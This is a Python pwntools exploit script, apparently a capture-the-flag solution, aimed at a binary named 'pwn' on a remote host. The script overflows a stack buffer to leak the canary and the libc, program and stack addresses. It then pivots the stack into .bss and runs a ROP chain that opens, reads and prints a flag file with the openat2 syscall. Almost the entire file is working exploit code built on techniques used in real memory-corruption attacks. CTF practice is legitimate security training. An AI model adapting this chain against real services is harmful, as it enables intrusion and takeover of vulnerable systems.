#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./pwn')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('49.233.5.204', 9999)
    libc = ELF('./libc.so.6')

# '1' for read
# '2' for write
# leak canary
sa('>> ', '2'.ljust(8, '\x00') + 'A' * 8)
#gdb.attach(p)
sl('B' * 0x108)
sa('>> ', '1'.ljust(8, '\x00') + 'A' * 8)
ru('buffer: ' + 'B' * 0x108 + '\n')
data = ru('\x01\n')
info('len(data) = ' + str(len(data)))
canary = uu64(data[:-2].rjust(8, '\x00'))
info('canary = ' + hex(canary))

# leak libc
fake_canary = 0xdeadbeefcafebabe
sa('>> ', '2'.ljust(8, '\x00') + 'A' * 8)
#gdb.attach(p)
payload = 'B' * 0x108 + up64(fake_canary) + 'B' * 7
sl(payload)
sa('>> ', '1'.ljust(8, '\x00') + 'A' * 8)
ru('buffer: ' + payload + '\n')
data = ru('\n')[:-1]
info('len(data) = ' + str(len(data)))
libc_base = uu64(data.ljust(8, '\x00')) - 0x29d90
info('libc_base = ' + hex(libc_base))

# leak elf
sa('>> ', '2'.ljust(8, '\x00') + 'A' * 8)
payload = 'B' * 0x108 + up64(fake_canary) + 'B' * 23
sl(payload)
sa('>> ', '1'.ljust(8, '\x00') + 'A' * 8)
ru('buffer: ' + payload + '\n')
data = ru('\n')[:-1]
info('len(data) = ' + str(len(data)))
elf_base = uu64(data.ljust(8, '\x00')) - 0x1512
info('elf_base = ' + hex(elf_base))
bss_buf = elf_base + 0x4100
info('bss_buf = ' + hex(bss_buf))

# leak stack
sa('>> ', '2'.ljust(8, '\x00') + 'A' * 8)
payload = 'B' * 0x108 + up64(fake_canary) + 'B' * 39
sl(payload)
sa('>> ', '1'.ljust(8, '\x00') + 'A' * 8)
ru('buffer: ' + payload + '\n')
data = ru('\n')[:-1]
info('len(data) = ' + str(len(data)))
stack_addr = uu64(data.ljust(8, '\x00'))
info('stack_addr = ' + hex(stack_addr))

# rop
path = '/pwn/flag'
if local:
    pop_rdi_ret = libc_base + 0x000000000002a3e5
    pop_rsi_ret = libc_base + 0x000000000002be51
    pop_rdx_r12_ret = libc_base + 0x000000000011f497
    pop_rax_ret = libc_base + 0x0000000000045eb0
    read_addr = libc_base + libc.sym['read']
    syscall_ret = libc_base + 0x91396
    leave_ret = libc_base + 0x00000000000562ec
    pop_rsp_ret = libc_base + 0x0000000000035732
    ret = libc_base + 0x0000000000029cd6
    pop_rdi_ret = libc_base + 0x000000000002a3e5
    pop_rcx_ret = libc_base + 0x000000000008c6bb
    # 0x000000000005a2c2 : mov rdi, rax ; cmp rdx, rcx ; jae 0x5a2ac ; mov rax, r8 ; ret
    mov_rdi_rax_ret = libc_base + 0x000000000005a2c2
else:
    pop_rdi_ret = libc_base + 0x000000000002a3e5
    pop_rsi_ret = libc_base + 0x000000000002be51
    pop_rdx_r12_ret = libc_base + 0x000000000011f497
    pop_rax_ret = libc_base + 0x0000000000045eb0
    read_addr = libc_base + libc.sym['read']
    syscall_ret = libc_base + 0x0000000000029db4
    leave_ret = libc_base + 0x00000000000562ec
    pop_rsp_ret = libc_base + 0x0000000000035732
    ret = libc_base + 0x0000000000029cd6
    pop_rdi_ret = libc_base + 0x000000000002a3e5
    pop_rcx_ret = libc_base + 0x000000000008c6bb
    # 0x000000000005a2c2 : mov rdi, rax ; cmp rdx, rcx ; jae 0x5a2ac ; mov rax, r8 ; ret
    mov_rdi_rax_ret = libc_base + 0x000000000005a2c2
sa('>> ', '2'.ljust(8, '\x00') + 'A' * 8)
payload = 'B' * 0x108 + up64(canary) + up64(stack_addr - 0xc8)
payload += (
    up64(pop_rdi_ret) + up64(0) + 
    up64(pop_rsi_ret) + up64(bss_buf) + 
    up64(pop_rdx_r12_ret) + up64(0x200) + up64(0) + 
    up64(read_addr) + 
    up64(leave_ret) + 
    up64(bss_buf + 0x28) + # new rbp
    up64(pop_rsp_ret) + up64(bss_buf + 0x28) # new rsp
)
sl(payload)
#gdb.attach(p, 'pie breakpoint 0x1748\nc')
sa('>> ', '3'.ljust(8, '\x00') + 'C' * 8)

#input('@')
#s('A' * 0x28 + 'B' * 8)

input('@')
sleep(1)
# openat2 --> https://elixir.bootlin.com/linux/v6.0-rc7/source/include/uapi/asm-generic/unistd.h#L854
sys_openat2 = 437
if local:
    # 0x000000000017d530 : mov r10, qword ptr [rsi - 0x1f] ; mov r11, qword ptr [rsi - 0x17] ; mov rcx, qword ptr [rsi - 0xf] ; mov rdx, qword ptr [rsi - 8] ; mov qword ptr [rdi - 0x1f], r10 ; mov qword ptr [rdi - 0x17], r11 ; mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
    gadget = libc_base + 0x000000000017d530
else:
    gadget = libc_base + 0x000000000017d530
payload = (
    up64(ret) + 
    up64(pop_rdi_ret) + up64(bss_buf) + up64(pop_rsi_ret) + up64(bss_buf + 0x20 + 0x1f) + up64(gadget) + 
    up64(pop_rax_ret) + up64(sys_openat2) + 
    up64(pop_rdi_ret) + up64(0) + 
    up64(pop_rsi_ret) + up64(bss_buf) + 
    up64(pop_rdx_r12_ret) + up64(bss_buf + 0x200) + up64(0) + 
    up64(syscall_ret)
)
# read
payload += (
    up64(pop_rdx_r12_ret) + up64(0) + up64(0) + up64(pop_rcx_ret) + up64(1) + up64(mov_rdi_rax_ret) + 
    up64(pop_rax_ret) + up64(0) + 
    up64(pop_rsi_ret) + up64(bss_buf + 0x200) + 
    up64(pop_rdx_r12_ret) + up64(0x50) + up64(0) + 
    up64(syscall_ret)
)
# write
payload += (
    up64(pop_rax_ret) + up64(1) + 
    up64(pop_rdi_ret) + up64(1) + 
    up64(pop_rsi_ret) + up64(bss_buf + 0x200) + 
    up64(pop_rdx_r12_ret) + up64(0x50) + up64(0) + 
    up64(syscall_ret)
)
# exit
payload += (
    up64(pop_rax_ret) + up64(60) + 
    up64(pop_rdi_ret) + up64(0) + 
    up64(syscall_ret)
)
info('len(payload) = ' + hex(len(payload)))
sl(path.ljust(0x20, '\x00') + up64(0x18) + payload)

#gdb.attach(p)

p.interactive()

